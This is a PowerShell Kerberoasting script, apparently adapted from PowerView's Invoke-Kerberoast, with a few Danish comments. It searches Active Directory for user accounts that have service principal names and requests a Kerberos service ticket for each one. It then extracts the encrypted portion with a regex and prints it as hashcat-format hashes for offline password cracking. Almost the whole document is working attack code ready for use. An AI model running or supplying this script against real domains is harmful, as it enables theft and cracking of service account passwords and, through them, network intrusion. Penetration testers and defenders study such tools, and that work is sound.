Add-Type -Assemblyname System.IdentityModel
$ErrorActionPreference = 'silentlycontinue'

#variabler
$TargetAccount = "TESTHEST"
$Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$Path = 'GC://DC=' + ($Forest.RootDomain -Replace ("\.",',DC='))
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
$Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null

<#
The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. 
Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.
You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
#>

$ad_search = New-Object DirectoryServices.DirectorySearcher
$ad_search.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))" #Vil ikke have computernavne men kun service principal names
$user_objects = $ad_search.FindAll()
foreach($user in $user_objects) {
                 $user_entry = $user.GetDirectoryEntry()
                 $distinguishedName = $user_entry.distinguishedName
                 $samAccountName = $user.Properties['samaccountname']
                 foreach( $SPN in $user_entry.ServicePrincipalName ) {
                    $Searcher.Filter = "(servicePrincipalName=$SPN)"
                    $TargetAccount = [string]$Searcher.FindOne().Properties.userprincipalname
                    $SPN_string += $SPN
                    $error.clear()
                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist $SPN
                    $bytestream = $ticket.GetRequest()
                    
                    $hexstream = [System.BitConverter]::ToString($bytestream) -Replace "-"
                    if ($bytestream) {      
                        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                        # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                        if($hexstream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
        
                            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                            if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                                Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                                $hash = $null
                            } else {
                                $hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                            }
                        } else {
                            Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                            $hash = $null
                        }
                    }
                    $outputformat = 'hashcat'

                    if($hash) {
                        if ($outputformat -match 'JOHN') {
                            $hashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$hash"
                            Write-Output "`nHash for the following account $($samAccountName) is:"
                            Write-Output $hashFormat
                        }
                        
                        else {
                            if ($distinguishedName) {
                                $UserDomain = $distinguishedName.SubString($distinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            }
                        }
                        $hashFormat = "`$krb5tgs`$$($Etype)`$*$samAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                        Write-Output "`nHash for the following account $($samAccountName) is:"
                        Write-Output $hashFormat
                    }
                 
            }
        }
